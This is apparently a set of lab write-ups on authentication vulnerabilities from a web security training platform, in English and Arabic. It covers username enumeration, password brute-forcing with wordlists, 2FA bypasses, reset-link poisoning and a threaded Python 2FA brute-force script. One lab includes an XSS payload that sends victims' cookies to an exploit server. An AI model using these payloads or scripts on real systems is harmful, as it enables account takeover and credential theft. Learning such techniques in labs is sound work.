# Authentication vulnerabilities



<details>
  <summary>Lab: Username enumeration via different responses</summary>

> ### try invalid usernaem ``admin``

<img width="1030" height="436" alt="image" src="https://github.com/user-attachments/assets/ae7dc0ef-29c0-4040-95a1-7011a3012721" />

> ### try to bruteforce username and match ``Invalid username``

<img width="1604" height="553" alt="image" src="https://github.com/user-attachments/assets/25abcbc9-5139-4067-b66f-27aa66b63cb8" />

<img width="1277" height="469" alt="image" src="https://github.com/user-attachments/assets/2d856d21-4f13-420d-a978-5b3fd040ab66" />

### so now username is 

```
user
```

---

> ### now bruteforce the password:

<img width="1016" height="358" alt="image" src="https://github.com/user-attachments/assets/65292c04-6634-4f0a-befa-d58f1a5474c4" />

so passowrd is :

```
iloveyou
```

<img width="1341" height="617" alt="image" src="https://github.com/user-attachments/assets/77519529-471c-40f0-9f0a-7c447c705326" />





  
</details>






<details>
  <summary>Lab: 2FA simple bypass</summary>


<img width="1105" height="319" alt="image" src="https://github.com/user-attachments/assets/7fbed2c2-8e4d-4fd5-bbc8-7d820821a746" />


  
</details>




<details>
  <summary>Lab: Password reset broken logic</summary>


- > click reset password and check email box you will found link click on it if you try to remove token error will apper
  >
  > write new password and intercept the request now you can remove token and change user to carlos 



  
</details>





<details>
  <summary>Lab: Username enumeration via subtly different responses</summary>

```
✅ 4.Username enumeration via subtly different responses
الثغرة: التطبيق بيرجع رسائل خطأ مختلفة بشكل طفيف جدًا حسب إذا كان اليوزر موجود أو مش موجود.
مثلًا:

Invalid username or password. ← لو اليوزر مش موجود.

Invalid password or password ← لو اليوزر موجود.

الرسالة شكلها شبه بعض لكن فيها فرق بسيط جدًا، والمهاجم ممكن يلاحظه.
```



  
</details>







<details>
  <summary>Lab: Username enumeration via response timing</summary>

```
✅ 5. Username enumeration via response timing
الثغرة: الاختلاف في زمن الاستجابة لما يكون اليوزر موجود.

الاستغلال: لو زمن الاستجابة أطول مع يوزر معين → غالبًا موجود (لأن الباسورد بيتشيك بعده).


```

  
</details>






<details>
  <summary>Lab: Broken brute-force protection, IP block</summary>


```
افتح Burp Suite واعمل Proxy للـ login page.

جرب تدخل بيانات غلط 3 مرات وراء بعض:

لاحظ إن بعد 3 محاولات فاشلة بيظهر block للـ IP (مثلاً رسالة error أو delay).

جرب بعد محاولتين فاشلتين تعمل login ناجح بحسابك (wiener:peter):

هتلاحظ إن العداد بيرجع للصفر وتقدر تكمل المحاولات بدون block.
```

### ``usernames``

```
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
wiener
carlos
```

### ``passwords``

```
peter
123456
peter
password
peter
12345678
peter
qwerty
peter
123456789
peter
12345
peter
1234
peter
111111
peter
1234567
peter
dragon
peter
123123
peter
baseball
peter
abc123
peter
football
peter
monkey
peter
letmein
peter
shadow
peter
master
peter
666666
peter
qwertyuiop
peter
123321
peter
mustang
peter
1234567890
peter
michael
peter
654321
peter
superman
peter
1qaz2wsx
peter
7777777
peter
121212
peter
000000
peter
qazwsx
peter
123qwe
peter
killer
peter
trustno1
peter
jordan
peter
jennifer
peter
zxcvbnm
peter
asdfgh
peter
hunter
peter
buster
peter
soccer
peter
harley
peter
batman
peter
andrew
peter
tigger
peter
sunshine
peter
iloveyou
peter
2000
peter
charlie
peter
robert
peter
thomas
peter
hockey
peter
ranger
peter
daniel
peter
starwars
peter
klaster
peter
112233
peter
george
peter
computer
peter
michelle
peter
jessica
peter
pepper
peter
1111
peter
zxcvbn
peter
555555
peter
11111111
peter
131313
peter
freedom
peter
777777
peter
pass
peter
maggie
peter
159753
peter
aaaaaa
peter
ginger
peter
princess
peter
joshua
peter
cheese
peter
amanda
peter
summer
peter
love
peter
ashley
peter
nicole
peter
chelsea
peter
biteme
peter
matthew
peter
access
peter
yankees
peter
987654321
peter
dallas
peter
austin
peter
thunder
peter
taylor
peter
matrix
peter
mobilemail
peter
mom
peter
monitor
peter
monitoring
peter
montana
peter
moon
peter
moscow

```



<img width="1676" height="794" alt="image" src="https://github.com/user-attachments/assets/9922e3be-dddc-49af-a0f1-7e6fb80bf588" />


```
carlos : daniel
```

<img width="1313" height="602" alt="image" src="https://github.com/user-attachments/assets/6ef4ebcb-564a-410c-ab9a-39c3a6ce3213" />





  
</details>








<details>
   <summary>Lab: Brute-forcing a stay-logged-in cookie</summary>


### 🎱``8 Lab: Brute-forcing a stay-logged-in cookie``

- > first login with ``wiener:peter`` with stay logged in option and inturcept the request
  >
  > ``found``
  >
  > <img width="1167" height="424" alt="image" src="https://github.com/user-attachments/assets/098dcadc-95fb-436c-ae1d-fde1290cc3a4" />
  >
  > ```
  > Cookie: session=X2AecSWQYF3pEDwqbjSuG6FYLHSV6IGq; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
  > ```
  >
  > as you see ``stay-logged-in`` is decoded in **``base64``** when decode it found:
  >
  > ```
  > wiener:51dc30ddc473d43a6011e9ebba6ca770
  > ```
  >
  > ``structure of cookies``
  >
  > ```
  > base64(username:MD5(password))
  > ```
  >
  > ohh so this cookie have username and passowrd hashed in ``MD5`` after decrypt it found the password **``peter``**
  >
  > **``order is important``**
  >
  > <img width="1878" height="742" alt="image" src="https://github.com/user-attachments/assets/9f556feb-f647-4080-af43-767f6e5d969c" />
  > 
  > ![image](https://github.com/user-attachments/assets/d8ed9b02-4be1-4c3d-b40b-d4e1d4d1b8d9)
  >
  > 
  > 


   
  
</details>



















<details>
  <summary>Lab: Offline password cracking</summary>


### 9 offline password cracking 

- > first login with my username and passowrd ``wiener:peter`` with stay login button 
  >
  > found in cookie that is encoded in base64
  >
  > ``base64(username:md5(password))``
  >
  > now we know that comments is vuln to xss you will steal cookie of ``carlos`` by using xss
  >
  > in comment put
  >
  > ```
  > <script>document.location='https://exploit-0a1f000d0421311d80d80c4801090020.exploit-server.net/exploit'+document.cookie</script>
  > ```
  >
  > after that go to exploit server then logs you will find cookies of carlos
  >
  > ``Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz``
  >
  > ``carlos:26323c16d5f4dabff3bb136f2460a943``
  >
  > ``carlos:onceuponatime``

  
</details>
















<details>
  <summary>Lab: Password reset poisoning via middleware</summary>


1. login with ``wiener`` with intercept the requests to burp
2. click Forgot password
3. check email you will found the forgot password link

```url
https://0a12002d04f669c8804203db001d00de.web-security-academy.net/forgot-password?temp-forgot-password-token=gdqz0wd8rbjy5naoxidh5gh986avyo73
```
  
4. use it to change password
5. now go to **``http history ``** in burp

```http
POST /forgot-password HTTP/2
Host: 0a12002d04f669c8804203db001d00de.web-security-academy.net
Cookie: session=Jeo1T3SAvjuL5M1hPBCX7juYaqJvr11U
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a12002d04f669c8804203db001d00de.web-security-academy.net
Referer: https://0a12002d04f669c8804203db001d00de.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


username=wiener
```

> ### change **``wiener``** to **``carlos``** and put **``X-Forwarded-Host``** header to your exploit server 

```http
X-Forwarded-Host: exploit-0a4500a80403694b801a029301f3005a.exploit-server.net

username=carlos
```

see logs 

<img width="1857" height="114" alt="image" src="https://github.com/user-attachments/assets/f55d2a68-86b7-4f93-9c76-27c9f02e3031" />

```url
/forgot-password?temp-forgot-password-token=z137ea4t8oymjlqytibtexwwy0srey8z
```

> ## now add new password to carlos and login 

<img width="1375" height="668" alt="image" src="https://github.com/user-attachments/assets/04c8bafe-f425-44d3-bbc1-2da500842d18" />

  
</details>

































<details>
  <summary>Lab: Username enumeration via account lock</summary>

<img width="1480" height="804" alt="image" src="https://github.com/user-attachments/assets/558b88cf-ae67-439c-9ca5-caac98a2280e" />

```
carlos
carlos
carlos
carlos
carlos
root
root
root
root
root
admin
admin
admin
admin
admin
....
....

```

> ### THE REAL USERNAME WILL APPEAR ERROR: **`You have made too many incorrect login attempts. Please try again in 1 minute(s).`**


> ### SO USERNAME IS **`acceso`**





<img width="1543" height="738" alt="image" src="https://github.com/user-attachments/assets/2c27e85f-9d3b-4c07-b3b6-18f92347f884" />

> ### SO PASSWORD IS **`letmein`**

```
acceso : letmein
```

<img width="1779" height="845" alt="image" src="https://github.com/user-attachments/assets/e7e2dd78-6f7b-41bd-a779-ade23d51a0a8" />


  
</details>








<details>
  <summary>Lab: 2FA broken logic</summary>

<img width="1102" height="173" alt="image" src="https://github.com/user-attachments/assets/d701902a-1edd-4370-9cb7-e6df9b3dee61" />

---

1. login to your account **`wiener : peter`**
2. <img width="1296" height="613" alt="image" src="https://github.com/user-attachments/assets/df3add31-4a20-4768-a8b0-29c926dd4e32" />

```http
GET /login2 HTTP/2
Host: 0af700e5033811f784723b2500240055.web-security-academy.net
Cookie: session=IVwexIpV4Hmucl1mgiflN0hO6Any4WkY; verify=wiener
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af700e5033811f784723b2500240055.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```

> ### change **`wiener`** to `carlos` and send the request

```http
Cookie: session=IVwexIpV4Hmucl1mgiflN0hO6Any4WkY; verify=carlos
```

<img width="1539" height="753" alt="image" src="https://github.com/user-attachments/assets/cacb8b0c-b2b9-448e-829a-35fd0fb62a3f" />



> ### now the website send the **`2fa`** to carlos

> #### logout form your account and login to it again but don't write your **`2FA`** code and send the request to intruder

<img width="782" height="279" alt="image" src="https://github.com/user-attachments/assets/2b05d78d-45c0-4d15-b16c-e186a99a8e89" />

```http
POST /login2 HTTP/2
Host: 0af700e5033811f784723b2500240055.web-security-academy.net
Cookie: session=U0GvMCS0BxfbwbJ8iMImN16k1qfpKw5w; verify=wiener
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0af700e5033811f784723b2500240055.web-security-academy.net
Referer: https://0af700e5033811f784723b2500240055.web-security-academy.net/login2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


mfa-code=123456
```

> ### change **`wiener`** to `carlos`
>
> add **`123456`** as payload and set `payload type` brute forcer 

<img width="1876" height="758" alt="image" src="https://github.com/user-attachments/assets/79203d2a-2f9d-41b1-8885-39823c515aa0" />

> ### see **``302``**

<img width="1703" height="815" alt="image" src="https://github.com/user-attachments/assets/a0105171-2c54-48e6-bce6-e145c8bd40b1" />

> click **`view response in browser`**  

<img width="1178" height="552" alt="image" src="https://github.com/user-attachments/assets/b3e1371f-3053-42ca-a6ce-f7cc89da9ccb" />

<img width="1890" height="838" alt="image" src="https://github.com/user-attachments/assets/bbdf9caa-d367-4366-8b5a-f96d9fe7e1f0" />

<img width="1417" height="822" alt="image" src="https://github.com/user-attachments/assets/884e0d3c-2b5f-4a11-9a57-718c7f7892ba" />

<img width="1565" height="749" alt="image" src="https://github.com/user-attachments/assets/7294253e-6ed6-4bc1-9061-224ac2d471b4" />

  
</details>










<details>
  <summary>Lab: Password brute-force via password change</summary>

```
old pass       neww pass 1        new pass 2
-----------------------------------------------------------------------------------
❌                🟩                 🟩        ===> will return to /login

-----------------------------------------------------------------------------------

🟩                🟩                 ❌        ===> New passwords do not match

-----------------------------------------------------------------------------------

❌                🟩                 ❌        ===> Current password is incorrect

 ```

> ### so if we don't know the old password and try to put new one will make use retrun to **`/login`** so we can't to brute force to bypass it we will found that if we put ``not matched new passwords it tell us that old passowrd is not correct`` so we can brute force 


----

<img width="1883" height="731" alt="image" src="https://github.com/user-attachments/assets/3ca615ba-e7da-4616-90d6-667fa218dc4d" />

```
username=carlos&current-password=plapla&new-password-1=123&new-password-2=1234
```

``set grep/match to New passwords do not match``

<img width="741" height="467" alt="image" src="https://github.com/user-attachments/assets/edcf439f-9e2d-4aa9-b168-8d1bad8ccc42" />

---

<img width="1511" height="719" alt="image" src="https://github.com/user-attachments/assets/17bafaf1-8162-491c-bc3d-5b99e2ce663b" />

> `found that in response say New passwords do not match that is mean the old passowrd is true put the new are not match so we know the passowrd` :

```
carlos : joshua
```

<img width="1295" height="600" alt="image" src="https://github.com/user-attachments/assets/02002043-0a12-4124-87e6-0aa249a622d0" />


  
</details>
















----- 

<details>
  <summary>🟪 Lab: Broken brute-force protection, multiple credentials per request</summary>

1. try to login as **`calos`** : 

```json
{"username":"carlos","password":"aaa"}
```

**`Invalid username or password.`**


2. try to send multiple credentials per request

```json
{

  "username":"carlos",
  "password":[
       "aaa",
       "passowrd",
       ...
    ]
}
```

## **`Full json`**

```json
{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow"
  ]
}

```


### click on response and choose show response on browzer or 

> take cookie value in response and use cookie editor extension and add cookie and visit **`/my-account?id=carlos`**

```
session=VWwWkwr7osG8fIq5lqwIrI7s0tB99OB7;
```


<img width="1824" height="835" alt="image" src="https://github.com/user-attachments/assets/d740bb54-1f52-471c-8d2f-6bf90eb92e8c" />


  
</details>



<details>
  <summary>🟪 Lab: 2FA bypass using a brute-force attack</summary>

```python
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time

BASE_URL = "https://0ac9002b0360b47981c811be0055002a.web-security-academy.net/"
USERNAME = "carlos"
PASSWORD = "montoya"

lock = threading.Lock()
found_code = threading.Event()

# ---------------------------
# Create a fresh session
# ---------------------------
def create_session():
    return requests.Session()

# ---------------------------
# Get CSRF Token
# ---------------------------
def get_csrf(session, url):
    r = session.get(url)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_input = soup.find("input", {"name": "csrf"})
    return csrf_input["value"] if csrf_input else None

# ---------------------------
# Login with username/password
# ---------------------------
def login(session):
    csrf_token = get_csrf(session, f"{BASE_URL}/login")
    if not csrf_token:
        print("[!] Failed to get CSRF token for login.")
        return False

    data = {
        "csrf": csrf_token,
        "username": USERNAME,
        "password": PASSWORD
    }

    r = session.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if r.status_code == 302 and "/login2" in r.headers.get("Location", ""):
        return True
    return False

# ---------------------------
# Try a single 2FA code
# ---------------------------
def try_code(code):
    if found_code.is_set():
        return None

    # Create a new session and login
    session = create_session()
    if not login(session):
        print(f"[ERROR] Failed to log in before trying code {code}")
        return None

    # Prepare 2FA data
    mfa_code = str(code).zfill(4)
    csrf_token = get_csrf(session, f"{BASE_URL}/login2")

    if csrf_token:
        data = {
            "csrf": csrf_token,
            "mfa-code": mfa_code
        }
    else:
        data = {"mfa-code": mfa_code}

    # Send the 2FA attempt
    r = session.post(f"{BASE_URL}/login2", data=data, allow_redirects=False)

    # Debugging
    if r.status_code == 302:
        location = r.headers.get("Location", "")
        if "/my-account" in location:
            with lock:
                if not found_code.is_set():
                    print(f"[+] 2FA code found: {mfa_code}")

                    # Get the session cookie
                    cookies = session.cookies.get_dict()
                    if cookies:
                        print("[+] Session Cookies:")
                        for name, value in cookies.items():
                            print(f"{name} = {value}")

                    found_code.set()
            return mfa_code

        elif "/login" in location:
            print(f"[!] Code {mfa_code} failed twice, redirected to login.")
    return None

# ---------------------------
# Brute-force 2FA
# ---------------------------
def brute_force_2fa():
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(try_code, code): code for code in range(10000)}

        for i, future in enumerate(as_completed(futures)):
            if i % 50 == 0:
                print(f"[*] Tried up to: {str(i).zfill(4)}")

            result = future.result()
            if result:
                print(f"[SUCCESS] Final 2FA Code: {result}")
                return result

    print("[-] No valid 2FA code found.")
    return None

# ---------------------------
# Main
# ---------------------------
if __name__ == "__main__":
    start_time = time.time()
    brute_force_2fa()
    print(f"Finished in {time.time() - start_time:.2f} seconds")
```

<img width="907" height="582" alt="image" src="https://github.com/user-attachments/assets/ff67ed96-f33d-400b-a134-9662e8434769" />

### use cookie editor extension and put the new cookie and refresh

<img width="1593" height="651" alt="image" src="https://github.com/user-attachments/assets/8a3714a4-f388-47a9-bad0-9ad3bed35b95" />



<details>
  <summary>summary</summary>



# 2FA Bypass using Brute-force Attack

## **فكرة التحدي**
الموقع بيستخدم **2FA (Two-Factor Authentication)** بعد تسجيل الدخول.  
حتى لو عندك **username** و **password** صح (في حالتنا `carlos:montoya`)، لسه لازم تدخل كود مكوّن من **4 أرقام** يتغير بعد فترة.  

الثغرة هنا إن **صفحة 2FA نفسها قابلة لعملية brute-force**، ومفيش أي **rate limiting** أو حماية قوية تمنع المحاولات المتكررة.  
لكن في مشكلة:  
- لو جربت كودين غلط ورا بعض، الموقع بيرجعك للـ login page.
- كمان كل محاولة محتاجة **CSRF token** جديد وجلسة session جديدة.

---

## **خطوات الحل**
### 1. **تحليل الطلبات**
- لقينا إن تسجيل الدخول بيتم بـ `/login` ومعاه:
  ```
  csrf=<token>&username=carlos&password=montoya
  ```
- بعد كده بيتحول المستخدم لـ `/login2` لإدخال كود الـ 2FA، والطلب بيحتاج:
  ```
  csrf=<token>&mfa-code=1234
  ```
- طول الكود = 4 أرقام → يعني من `0000` لحد `9999`.

### 2. **تحديات واجهتنا**
- لازم نعمل **تسجيل دخول جديد** لكل محاولة عشان نجيب `session` و `csrf` صالحين.
- بعد محاولتين غلط بيتم إرجاعك للصفحة الأولى.
- سرعة التنفيذ كانت بطيئة جدًا لما بدأنا نجرب الكودات واحدة واحدة.

### 3. **الحل البرمجي**
- كتبنا **script بلغة Python** يستخدم مكتبة `requests`.
- الخطوات اللي بينفذها لكل كود:
  1. يعمل `session` جديد.
  2. يجيب **CSRF token** من `/login`.
  3. يدخل بيانات `username` و `password`.
  4. يجيب **CSRF token** جديد من `/login2`.
  5. يجرب كود 2FA.
- لو رجع الرد **302 Redirect** لـ `/my-account` → الكود صحيح ✅.

### 4. **التسريع**
- استخدمنا **ThreadPoolExecutor** لتجربة أكتر من كود في نفس الوقت.
- خلينا 10 محاولات متوازية، فده سرّع الهجوم جدًا.

---

## **النتيجة النهائية**
- الـ script نجح في إيجاد الكود الصحيح:  
  ```
  [+] 2FA code found: 0564
  ```
- بعدها قدرنا ندخل على حساب Carlos ونجيب الـ session cookie النهائية.

---




  
</details>





  
</details>










































